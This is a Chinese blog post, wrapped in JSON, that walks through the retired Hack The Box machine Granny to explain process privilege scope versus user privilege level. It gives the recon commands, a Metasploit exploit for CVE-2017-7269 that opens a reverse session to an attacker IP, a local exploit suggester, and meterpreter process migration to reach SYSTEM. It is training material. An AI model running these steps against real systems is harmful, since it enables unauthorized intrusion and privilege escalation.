{"title":"渗透测试杂谈--权限范围与权限级别","date":"2023-09-13T00:00:00.000Z","date_formatted":{"ll":"Sep 13, 2023","L":"09/13/2023","MM-DD":"09-13"},"link":"2023/09/13/渗透测试杂谈--权限范围与权限级别","updated":"2024-08-19T09:04:13.772Z","content":"<p>很多初入网安的师傅们在不经常接触内网以及实际项目时，对于权限的认知通常只会停留在权限级别上。权限级别，也就是我们常说的用户权限。拿到shell后执行的whoami/id命令通常被第一个执行出来用来检查当前据点的用户权限。然而实际上，不同的getshell过程即使拥有同一个用户shell得到的权限也是不同的，这里就要引入权限范围（Privilege Scope）概念。</p>\n<p>接下来让我们以一次模拟渗透举例。</p>\n<h2 id=\"环境介绍\">环境介绍<a title=\"#环境介绍\" href=\"#环境介绍\"></a></h2>\n<p>这里靶场环境使用Hack The Box的退役机器Granny，链接可以在<a href=\"https://app.hackthebox.com/machines/Granny\" target=\"_blank\">这里</a>找到。</p>\n<p>目标IP：10.10.10.15</p>\n<p>攻击机：10.10.14.6\t网卡标识：tun0</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131559789.png\" alt=\"image-20230913155935640\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"探测\">探测<a title=\"#探测\" href=\"#探测\"></a></h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ports=$(masscan -p1-65535 10.10.10.15 -e tun0 --rate=1000 | grep &quot;Discover*&quot; | awk &#x27;&#123;print $4&#125;&#x27; | cut -d &#x27;/&#x27; -f 1 | tr &#x27;\\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)</span><br><span class=\"line\">nmap -sCV -T4 -p$ports 10.10.10.15</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131609644.png\" alt=\"image-20230913160929278\" loading=\"lazy\" class=\"φbp\"></p>\n<p>这里可以看到一个IIS6.0在目标80端口运行，直接找可用漏洞。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">searchsploit IIS 6.0</span><br><span class=\"line\">searchsploit -x 41738</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131614933.png\" alt=\"image-20230913161440725\" loading=\"lazy\" class=\"φbp\"></p>\n<p>下面就可以直接调MSF打了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">search CVE-2017-7269</span><br><span class=\"line\">use 0</span><br><span class=\"line\">set LHOST 10.10.14.6</span><br><span class=\"line\">set RHOST 10.10.10.15</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131623016.png\" alt=\"image-20230913162348436\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"权限范围对于渗透测试的影响\">权限范围对于渗透测试的影响<a title=\"#权限范围对于渗透测试的影响\" href=\"#权限范围对于渗透测试的影响\"></a></h2>\n<p>接下来让我们尝试使用meterpreter的getuid获取当前账户信息试试。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131625626.png\" alt=\"image-20230913162519531\" loading=\"lazy\" class=\"φbp\"></p>\n<p>报错Access denied。</p>\n<p>进入shell查看当前shell用户。<br>\n<img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131649905.png\" alt=\"image-20230913164959771\" loading=\"lazy\"></p>\n<p>不仅如此，由于相当量的windowsAPI在该进程下无法调用，后渗透工作都将被卡在这儿。</p>\n<p>接下来我们尝试提权看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background</span><br><span class=\"line\">use post/multi/recon/local_exploit_suggester</span><br><span class=\"line\">set session 2</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>我们使用local_exploit_suggester模块尝试找出可用提权exp，经过一段时间脚本的运行，6个符合条件的脚本被筛选出来。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131656373.png\" alt=\"image-20230913165656975\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131657670.png\" alt=\"image-20230913165713436\" loading=\"lazy\" class=\"φbp\"></p>\n<p>然而经过尝试，6个脚本的执行结果均回显Access denied。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131658817.png\" alt=\"image-20230913165841526\" loading=\"lazy\" class=\"φbp\"></p>\n<p>这里其实就是因为meterpreter会话所在的进程权限过低导致的，不同进程即使同样权限级别,但可访问资源的权限范围(Privilege Scope)不同。权限范围其实就是指进程可以访问的资源和执行的操作的范围。具体来说:</p>\n<ul>\n<li>权限范围由进程的令牌(Token)决定，不同进程的Token包含不同权限。</li>\n<li>即使是同样的用户账户，不同进程也可能有不同的权限范围。</li>\n<li>值得注意的是，权限范围可以大于权限级别，因此，权限范围较大也可以让进程绕过某些权限控制。</li>\n</ul>\n<p>权限范围是进程真正权力的体现，仅检查权限级别不足以评估进程的能力。</p>\n<h2 id=\"dll注入迁移据点获得高权限范围\">DLL注入迁移据点获得高权限范围<a title=\"#dll注入迁移据点获得高权限范围\" href=\"#dll注入迁移据点获得高权限范围\"></a></h2>\n<p>接下来尝试通过DLL注入迁移据点，来寻找更可靠的进程。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps</span><br><span class=\"line\">migrate &#123;PID&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131702867.png\" alt=\"image-20230913170216656\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131702588.png\" alt=\"image-20230913170257512\" loading=\"lazy\" class=\"φbp\"></p>\n<p>这里选择了davcdata.exe，这时再尝试getuid。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131704375.png\" alt=\"image-20230913170431303\" loading=\"lazy\" class=\"φbp\"></p>\n<p>没有问题，我们继续提权。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Lq0ne/my_pic/202309131705261.png\" alt=\"image-20230913170526948\" loading=\"lazy\" class=\"φbp\"></p>\n<p>这样我们就通过转移进程据点，获取高权限范围再提权拿到SYSTEM权限。</p>\n<h2 id=\"一些杂谈\">一些杂谈<a title=\"#一些杂谈\" href=\"#一些杂谈\"></a></h2>\n<p>权限级别与权限范围的理解比较简单，实际应用中，我们可以把思路拓宽一些，进程权限其实在进程属性确定的时候就有了一个大致的甚至是确定的范围，比如：notepad权限小于浏览器权限，通过这样思路，我们可以更快速的完成据点的选择，提升攻击效率。</p>\n","prev":{"title":"Notion折腾--Mermaid图表工具","link":"2024/04/12/Notion折腾--Mermaid图表工具"},"plink":"https://Lq0ne.github.io/2023/09/13/渗透测试杂谈--权限范围与权限级别/","toc":[{"id":"环境介绍","title":"环境介绍","index":"1"},{"id":"探测","title":"探测","index":"2"},{"id":"权限范围对于渗透测试的影响","title":"权限范围对于渗透测试的影响","index":"3"},{"id":"dll注入迁移据点获得高权限范围","title":"DLL注入迁移据点获得高权限范围","index":"4"},{"id":"一些杂谈","title":"一些杂谈","index":"5"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"September 13, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/09/13/渗透测试杂谈--权限范围与权限级别/\" title=\"渗透测试杂谈--权限范围与权限级别\">https://Lq0ne.github.io/2023/09/13/渗透测试杂谈--权限范围与权限级别/</a>"},"reading_time":"1025 words in 7 min"}